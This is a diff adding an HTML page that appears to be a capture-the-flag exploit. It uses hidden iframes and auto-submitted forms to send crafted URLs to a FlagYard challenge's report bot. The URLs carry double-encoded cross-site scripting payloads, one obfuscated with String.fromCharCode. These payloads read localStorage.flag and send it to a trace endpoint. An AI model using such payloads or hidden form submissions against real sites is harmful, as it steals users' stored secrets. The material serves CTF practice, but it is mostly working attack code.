@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>report12</title></head>
+<body>
+<p>queueing reports 12</p>
+<script>
+const TARGET = 'http://k06749d7511f8df4bb76c71a2393a43af.playat.flagyard.com/?p=report';
+const base = 'http://127.0.0.1:5000/?p=view&dir=%253&file=';
+const urls = [
+  base + 'cimg%20src=/?p=trace%26id=botvisit2%26note=hello2%253e',
+  base + 'cimg%20src=x.js%20onerror=%2522this.src=%2527/?p=trace%26id=onerrrun1%26note=ran%2527%2522%253e',
+  base + 'cimg%20src=x.js%20onerror=%2522location=%2527/?p=trace%26id=stealflg1%26note=%2527%2BencodeURIComponent%28localStorage.flag%29%2522%253e',
+  base + 'cscript%253elocation=String.fromCharCode(47,63,112,61,116,114,97,99,101,38,105,100,61,115,99,114,105,112,116,97,103,49,38,110,111,116,101,61).concat(encodeURIComponent(localStorage.flag))/*'
+];
+urls.forEach(function (u, i) {
+  var iframe = document.createElement('iframe');
+  iframe.name = 'r' + i;
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = TARGET;
+  form.target = 'r' + i;
+  var input = document.createElement('input');
+  input.name = 'url';
+  input.value = u;
+  form.appendChild(input);
+  document.body.appendChild(form);
+  form.submit();
+});
+</script>
+</body>
+</html>
